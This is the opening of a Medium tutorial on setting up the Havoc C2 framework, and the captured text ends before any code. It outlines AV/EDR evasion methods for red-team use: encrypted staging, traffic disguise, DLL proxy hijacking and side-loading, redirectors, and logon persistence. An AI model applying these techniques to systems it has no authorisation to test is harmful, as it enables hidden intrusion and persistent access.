# https://medium.com/@sam.rothlisberger/havoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b

<!DOCTYPE html><html lang="en" data-rh="lang" dir="ltr"><body><div id="root"><div class="a b c"><a href="https://medium.com/sitemap/sitemap.xml" class="d">Sitemap</a><div class="e f g h i j k l"></div><div></div><div class="m c"><div class="m n o p c" style="transform: translateY(0px);"><div class="q r s t u v w x y j e z ab"><a class="eb ai ec bg am b ao ap aq ar as at au av t v x j e r ed ab" href="https://play.google.com/store/apps/details?id=com.medium.reader&amp;referrer=utm_source%3DmobileNavBar&amp;source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="ea"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" rel="noopener follow" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" data-discover="true">Sign in</a></span></p></div></div></div><div class="q r s ac ae af"><div class="ac r ag"><a class="ah ai aj ak al am an ao ap aq ar as at au av ac" aria-label="Homepage" data-testid="headerMediumLogo" rel="noopener follow" href="https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------" data-discover="true"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" aria-labelledby="wordmark-medium-desc" viewBox="0 0 719 160" class="aw ax ay"><desc id="wordmark-medium-desc">Medium Logo</desc><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="az i"><div class="ac ak ba bb bc r bd be"><div class="bn" aria-describedby="searchResults" aria-labelledby="searchResults" aria-haspopup="listbox" role="listbox"></div><div class="bo bp ac"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ak bf bg bh ab bi bj bk bl bm" placeholder="Search" value=""></div></div></div><div class="i l x fp fq"><span data-dd-action-name="Susi presentation tracker new_post_topnav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerWriteButton" rel="noopener follow" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav------------------" data-discover="true"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg>Write</div></a></span></div><div class="l k j e"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSearchButton" rel="noopener follow" href="https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------" data-discover="true"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Search</span></div></a></div><div class="ge i l k"><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" rel="noopener follow" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" data-discover="true">Sign in</a></span></p></div></div></div><div class="m"><div><div class="bn" role="tooltip" aria-describedby="1" aria-labelledby="1"><div tabindex="-1" class="bf"><button class="ak gf ao ac r aq fr gg gh gi" aria-label="user options menu" data-testid="headerUserIcon"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak gk"></div></div></button></div></div></div></div></div></div><div class="ac"><div class="cb i l k j cc" style="width: 0px;"></div><div class="cd bi ce cf cg ch" style="width: calc(100% + 0px);"><div class="m"><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div data-focus-lock-disabled="disabled"><div class="tz" role="dialog" aria-modal="true" tabindex="-1"><div class="yx yy bi ed yz za zb aq zc hd zd" aria-hidden="true" role="presentation"></div><div class="ze yz zf zg zh yx ed fk zi zj zk mb zl zm zn zo zp zq zr zs zt zu ac cv zv" aria-hidden="true"><div class="zw gy"></div></div></div></div><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div class="gl gm gn go gp m"><div class="ac ci"><div class="cp bi gq gr gs gt"></div></div><article><div class="m"><div class="m"><span class="m"></span><section><div><div class="fw gz zx hb hc hd"></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><div><h1 id="af9c" class="pw-post-title hj hk hl bg hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ig ih bl" data-testid="storyTitle" data-selectable-paragraph="">Havoc C2 with AV/EDR Bypass Methods in 2024 (Part 1)</h1></div><div><h2 id="cf8b" class="pw-subtitle-paragraph ii hk hl bg b ij ik il im in io ip iq ir is it iu iv iw ix cx eb" data-selectable-paragraph="">DISCLAIMER: Using these tools and methods against hosts that you do not have explicit permission to test is illegal. You are responsible for any trouble you may cause by using these tools and methods.</h2><div><div class="speechify-ignore ac cw"><div class="speechify-ignore bi m"><div class="ac iy iz ja jb jc jd je jf jg jh ji"><div class="ac r ji"><div class="ac jj"><div><div class="bn" aria-describedby="3" aria-labelledby="3" role="tooltip"><div tabindex="-1" class="bf"><a rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---byline--733d423fc67b---------------------------------------" data-discover="true"><div class="m jk jl by jm jn"><div class="m fr"><img alt="Sam Rothlisberger" class="m fk by bz ca de" width="32" height="32" loading="lazy" data-testid="authorPhoto" src="https://miro.medium.com/v2/resize:fill:32:32/1*Fzh2QBHCL67uIEt-y9at1w.jpeg"><div class="jo by m bz ca fw o jp gk"></div></div></div></a></div></div></div></div><span class="bg b bh ab bl"><div class="jq ac r"><div class="ac r jr"><div class="ac r"><div><div class="bn" aria-describedby="4" aria-labelledby="4" role="tooltip"><div tabindex="-1" class="bf"><span class="bg b bh ab bl"><a class="ah ai aj fo al am an ao ap aq ar as at js" data-testid="authorName" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---byline--733d423fc67b---------------------------------------" data-discover="true">Sam Rothlisberger</a></span></div></div></div></div><div class="jt bn"></div><button class="wg abq aq ac ci r abr abs abt" style="border: 1px solid rgba(13, 13, 13, 0.357);"><span class="bg b bh ab bl bi"><span class="bn abu">Follow</span></span></button></div></div></span></div><div class="ac r ju"><span class="bg b bh ab eb"><div class="ac ag"><span data-testid="storyReadTime">15 min read</span><div class="jv jw m" aria-hidden="true"><span class="m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span></div><span data-testid="storyPublishDate">Jan 27, 2024</span></div></span></div></div><div class="ac cw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km"><div class="i l x fp fq r"><div class="lc m"><div class="ac r ld le"><div class="pw-multi-vote-icon fr lf lg lh li"><span data-dd-action-name="Susi presentation tracker clap_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerClapButton" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F733d423fc67b&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b&amp;user=Sam+Rothlisberger&amp;userId=f215b9cd90cb&amp;source=---header_actions--733d423fc67b---------------------clap_footer------------------" data-discover="true"><div><div class="bn" aria-describedby="5" aria-labelledby="5" role="tooltip"><div tabindex="-1" class="bf"><div class="lj aq lk ll lm ln ao lo lp lq li" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></div></a></span></div><div class="pw-multi-vote-count m lr ls lt lu lv lw lx"><div><div class="bn" aria-describedby="65" aria-labelledby="65" role="tooltip"><div tabindex="-1" class="bf"><p class="bg b ec ab eb"><button class="ah ai aj fo al am an ao ap aq ar as at au av abv mg">586<span class="m i h g ue uf"></span></button></p></div></div></div></div></div></div><div><div class="bn" aria-describedby="6" aria-labelledby="6" role="tooltip"><div tabindex="-1" class="bf"><button class="aq lj mb mc ac r fs md me" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="ma"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg><p class="bg b ec ab eb"><span class="pw-responses-count lz ma">9</span></p></button></div></div></div></div><div class="ac r kn ko kp kq kr ks kt ku kv kw kx ky kz la lb"><div class="mf l k j e"></div><div class="i l"><div><div class="bn" aria-describedby="7" aria-labelledby="7" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerBookmarkButton" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F733d423fc67b&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b&amp;source=---header_actions--733d423fc67b---------------------bookmark_footer------------------" data-discover="true"><span class=""><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb mg" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div><div class="fk mh cu"><div class="m ag"><div class="ac ci"><div class="mi mj mk ml mm mn cp bi"><div class="ac"><span data-dd-action-name="Susi presentation tracker post_audio_button"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D733d423fc67b&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b&amp;source=---header_actions--733d423fc67b---------------------post_audio_button------------------" data-discover="true"><div><div class="bn" aria-describedby="54" aria-labelledby="54" role="tooltip"><div tabindex="-1" class="bf"><button aria-label="Listen" data-testid="audioPlayButton" class="ah fs aj fo al am an mo ap aq ar fe mp mq me mr ms mt mu mv t mw mx my mz na nb nc v nd ne nf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Listen</p></div></button></div></div></div></a></span></div></div></div></div></div><div class="bn" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bn" aria-describedby="9" aria-labelledby="9" role="tooltip"><div tabindex="-1" class="bf"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="ah fs aj fo al am an mo ap aq ar fe mp mq me mr ms mt mu mv t mw mx my mz na nb nc v nd ne nf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Share</p></div></button></div></div></div></div></div></div></div></div></div></div><p id="e4c4" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Havoc C2 is a modern and malicious post-exploitation framework that has quickly become one of many peoples’ favorite open-source C2s. Its features offer everything you need to complete a pentest or red team engagement. It was designed to be as malleable and modular as possible. That said, the Demon agent is designed to be interoperable with common techniques for bypassing AV/EDR with software such as loaders, packers, crypters, and stagers.</p><p id="9348" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">In 2024, we will need to do some things to customize our exploit chain to bypass AV/EDR/IDS. Specifically, we need to make our shellcode less likely to alert signature and dynamic analysis based detection on the host as well as make the network traffic look more normal:</p><ul class=""><li id="e480" class="ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe bl" data-selectable-paragraph="">Encrypt the first stage and second stage payload connections via HTTPS and use a validated/non default SSL certificate.</li><li id="538f" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">Add custom headers, user-agents, certs, URIs, jitter, and ROP chains in our stage one and stage two listeners/payloads to make it harder for Blue Teamers and AV/EDR to detect your C2 connection.</li><li id="126d" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">Make our custom DLL (loader) execute via DLL proxy hijacking and side-loading from a normal Portable Executable (PE) to remain undetected.</li><li id="37a8" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">Use a redirector server to hide the true location of our Team Server (command and control server) via port forwarding <strong class="ni hm">(PART 2)</strong></li><li id="4ef3" class="ng nh hl ni b ij of nk nl im og nn no np oh nr ns nt oi nv nw nx oj nz oa ob oc od oe bl" data-selectable-paragraph="">Put the executable and DLL in a normal program file folder and start on logon. <strong class="ni hm">(PART 2)</strong></li></ul><h2 id="3191" class="ok ol hl bg om on oo il op oq or io os ot ou ov ow ox oy oz pa pb pc pd pe pf bl" data-selectable-paragraph="">Setting Up Havoc C2</h2><p id="7992" class="pw-post-body-paragraph ng nh hl ni b ij pg nk nl im ph nn no np pi nr ns nt pj nv nw nx pk nz oa ob he bl" data-selectable-paragraph="">First, we need to set up the Team Server. This is a center hub for any victims that are running our agents.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm pn"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*QdNLWBL9Fjd9WhQJq7KJoA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*QdNLWBL9Fjd9WhQJq7KJoA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*QdNLWBL9Fjd9WhQJq7KJoA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*QdNLWBL9Fjd9WhQJq7KJoA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*QdNLWBL9Fjd9WhQJq7KJoA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*QdNLWBL9Fjd9WhQJq7KJoA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QdNLWBL9Fjd9WhQJq7KJoA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*QdNLWBL9Fjd9WhQJq7KJoA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*QdNLWBL9Fjd9WhQJq7KJoA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*QdNLWBL9Fjd9WhQJq7KJoA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*QdNLWBL9Fjd9WhQJq7KJoA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*QdNLWBL9Fjd9WhQJq7KJoA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*QdNLWBL9Fjd9WhQJq7KJoA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*QdNLWBL9Fjd9WhQJq7KJoA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="275" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*QdNLWBL9Fjd9WhQJq7KJoA.png"></picture></div></div><figcaption class="pz fm qa pl pm qb qc bg b bh ab eb" data-selectable-paragraph="">Setting up Team Server, The hub for all your C2 connections</figcaption></figure><p id="ad8a" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Then, run the client and connect it to the Team Server. The username/password and port number are in the ./profiles/havoc.yaotl file.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm qd"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ROeGEesh5jf8W0Ho_QTVcg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ROeGEesh5jf8W0Ho_QTVcg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ROeGEesh5jf8W0Ho_QTVcg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ROeGEesh5jf8W0Ho_QTVcg.png 786w, 